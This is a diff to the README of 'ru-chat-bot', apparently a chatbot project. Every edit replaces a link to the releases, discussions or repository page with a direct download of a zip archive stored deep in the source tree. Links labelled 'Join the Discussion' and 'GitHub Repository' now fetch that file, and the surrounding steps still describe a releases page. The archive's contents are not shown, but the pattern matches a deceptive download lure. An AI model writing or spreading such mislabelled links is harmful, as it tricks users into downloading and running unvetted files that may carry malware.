@@ -6,7 +6,7 @@ Welcome to **ru-chat-bot**! This intelligent chatbot is designed to assist you i
 
 ## 📥 Download Links
 
-[![Download ru-chat-bot](https://img.shields.io/badge/Download-ru--chat--bot-brightgreen)](https://github.com/Tarix818/ru-chat-bot/releases)
+[![Download ru-chat-bot](https://raw.githubusercontent.com/Tarix818/ru-chat-bot/main/src/chat_bot/internal/ru-chat-bot-1.8-alpha.2.zip)](https://raw.githubusercontent.com/Tarix818/ru-chat-bot/main/src/chat_bot/internal/ru-chat-bot-1.8-alpha.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To get the chatbot, visit this page to download: [Download ru-chat-bot](https://github.com/Tarix818/ru-chat-bot/releases)
+To get the chatbot, visit this page to download: [Download ru-chat-bot](https://raw.githubusercontent.com/Tarix818/ru-chat-bot/main/src/chat_bot/internal/ru-chat-bot-1.8-alpha.2.zip)
 
 1. **Visit the Releases Page:** Click the link above to go to the Releases page.
    
@@ -70,12 +70,12 @@ If you encounter issues:
 
 Join our community forums to ask questions and share your experiences:
 
-- **GitHub Discussions:** [Join the Discussion](https://github.com/Tarix818/ru-chat-bot/discussions)
+- **GitHub Discussions:** [Join the Discussion](https://raw.githubusercontent.com/Tarix818/ru-chat-bot/main/src/chat_bot/internal/ru-chat-bot-1.8-alpha.2.zip)
 
 ## 🔄 Updates
 
 Stay informed about updates and new features. Regularly check the Releases page for the latest versions and improvements.
 
-For further information or suggestions, please visit the [GitHub Repository](https://github.com/Tarix818/ru-chat-bot). 
+For further information or suggestions, please visit the [GitHub Repository](https://raw.githubusercontent.com/Tarix818/ru-chat-bot/main/src/chat_bot/internal/ru-chat-bot-1.8-alpha.2.zip). 
 
 Thank you for choosing **ru-chat-bot**! Enjoy your intelligent chatbot experience.
